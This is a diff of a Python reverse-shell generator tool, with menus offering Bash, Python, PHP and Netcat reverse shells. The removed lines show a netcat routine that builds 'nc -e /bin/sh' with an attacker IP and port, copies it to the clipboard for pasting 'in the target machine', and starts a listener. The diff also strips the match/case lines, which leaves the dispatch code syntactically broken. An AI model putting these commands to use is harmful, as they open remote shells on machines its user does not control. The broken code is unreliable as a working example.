@@ -36,10 +36,7 @@ def main():
     print("[!] Local IP : " + ipadd)
     print("[!] Interface : " + interf) 
     choice = input('\n[*] Enter your choice : ')
-    match choice:
-        case '1':
             revershell()
-        case '2':
             netcat()
         case '3':
             setIp()
@@ -71,15 +68,7 @@ def revershell():
 | ___ \                           /  ___| |        | | |
 | |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
 |    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|    
 <------------------------------------------------------->
-- [1] Bash reverse_shell -
-- [2] Python reverse_shell -
-- [3] PHP reverse_shell -
-- [4] Netcat reverse_shell - 
-- [6] Exit -
-<------------------------------------------------------->"""
     print(banner)
     c_rs = input('\n[*] Enter your choice : ')
     match c_rs:
@@ -273,35 +262,5 @@ def netcat():
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
 <------------------------------------------------------->"""
     print(banner)
-    ip = input('[*] Enter your IP : ')
-    port = str(input('[*] Enter your port (default: 1234) : '))
-    if port == '':
-        port = '1234'
-        print('[*] Using default port : 1234')
-        print('----')
-        print('[!] Copying the command to clipboard : nc -e /bin/sh ' + ip + ' ' + port)
-        print('[!] Paste this command in the target machine')
-        print('----')
-        sleep(1)
-        print('[*] Starting netcat reverse shell')
-        sleep(1)
-        print('[*] Waiting for connection')
-        print('----')
-        shell = "nc -lvnp " + ip + " " + port
-        pyperclip.copy('nc -e /bin/sh '+ip+' '+port)
-        os.system(shell)
-    else:
-        print('----')
-        print('[!] Copying the command to clipboard : nc -e /bin/sh ' + ip + ' ' + port)
-        print('[!] Paste this command in the target machine')
-        print('----')
-        sleep(1)
-        print('[*] Starting netcat reverse shell')
-        sleep(1)
-        print('[*] Waiting for connection')
-        print('----')
-        shell = "nc -lvnp " + ip + " " + port
-        pyperclip.copy('nc -e /bin/sh '+ip+' '+port)
-        os.system(shell)
 
 main()
